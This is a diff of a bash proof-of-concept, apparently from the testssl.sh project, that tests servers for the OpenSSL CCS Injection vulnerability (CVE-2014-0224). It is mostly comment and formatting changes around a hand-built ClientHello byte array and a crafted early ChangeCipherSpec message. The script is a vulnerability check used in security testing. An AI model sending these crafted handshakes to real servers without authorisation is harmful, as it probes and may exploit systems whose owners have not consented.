@@ -1,6 +1,7 @@
 #!/bin/bash 
 
-# POC bash socket implementation of CCS Injection vulnerability in OpenSSL (CVE-2014-0224), see https://www.openssl.org/news/secadv_20140605.txt
+# POC bash socket implementation of CCS Injection vulnerability in OpenSSL (CVE-2014-0224), 
+# see https://www.openssl.org/news/secadv_20140605.txt
 # Author: Dirk Wetter, GPLv2 see https://testssl.sh/LICENSE.txt 
 #
 # sockets inspired by http://blog.chris007.de/?p=238
@@ -13,11 +14,11 @@ NODE=""
 SLEEP=2
 DEBUG=${DEBUG:-0}
 
-[ -z "$1" ] && exit 1
+[ -z "$1" ] && exit 1  # host
 
+TLSV=${2:-x01}
 # TLS 1.0=x01  1.1=0x02, 1.2=0x3
 # the PoC contains per default only check for TLS1.0 as the is the least common denominator
-TLSV=${2:-x01}
 
 ccs_message="\x14\x03\tls_version\x00\x01\x01"
 ##                                                   ^^^^^^^ this is the thing!
@@ -26,18 +27,19 @@ client_hello="
 # TLS header ( 5 bytes)
 ,x16,               # Content type (x16 for handshake)
 x03, tls_version,   # TLS Version
-x00, x93,           # Length
+x00, x93,           # Length total
 # Handshake header
 x01,                # Type (x01 for ClientHello)
-x00, x00, x8f,      # Length
+x00, x00, x8f,      # Length client hello
 x03, tls_version,   # TLS Version
-# Random (32 byte) Unix time etc, see www.moserware.com/2009/06/first-few-milliseconds-of-https.html
-x53, x9c, xb2, xcb, x4b, 
-x42, xf9, x2d, x0b, xe5, x9c, x21, xf5, xa3, x89, xca, x7a, xd9, xb4, xab, x3f,
-xd3, x22, x21, x5e, xc4, x65, x0d, x1e, xce, xed, xc2,
+x53, x9c, xb2, xcb, # 4 bytes Unix time  see www.moserware.com/2009/06/first-few-milliseconds-of-https.html
+x4b, x42, xf9, x2d, x0b, xe5, x9c, x21, # 28 bytes random bytes
+xf5, xa3, x89, xca, x7a, xd9, xb4, xab, 
+x3f, xd3, x22, x21, x5e, xc4, x65, x0d, 
+x1e, xce, xed, xc2,
 x00,               # Session ID length
 x00, x68,          # Cipher suites length
-  xc0, x13,
+  xc0, x13,        # ciphers come now, here: ECDHE-RSA-AES128-SHA = TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
   xc0, x12,
   xc0, x11,
   xc0, x10,
@@ -88,8 +90,8 @@ x00, x68,          # Cipher suites length
   x00, x04,
   x00, x03,
   x00, x02,
-  x00, x01,
-  x01, x00"
+  x00, x01,  # TLS_RSA_WITH_NULL_MD5
+  x01, x00"  # compression methods length (1) + Compression method(1)
 
 msg=`echo "$client_hello" | sed -e 's/# .*$//g' -e 's/,/\\\/g' | sed -e 's/ //g' | tr -d '\n'`
 
@@ -180,9 +182,13 @@ else
 	ret=1
 fi
 
+# closing fd:
+exec 5<&-
+exec 5>&-
+
 echo
 exit $ret
 
 
 #  vim:tw=100:ts=5:sw=5
-#  $Id: ccs-injection.sh,v 1.4 2014/10/08 11:06:47 dirkw Exp $ 
+#  $Id: ccs-injection.sh,v 1.5 2014/11/03 20:45:47 dirkw Exp $ 
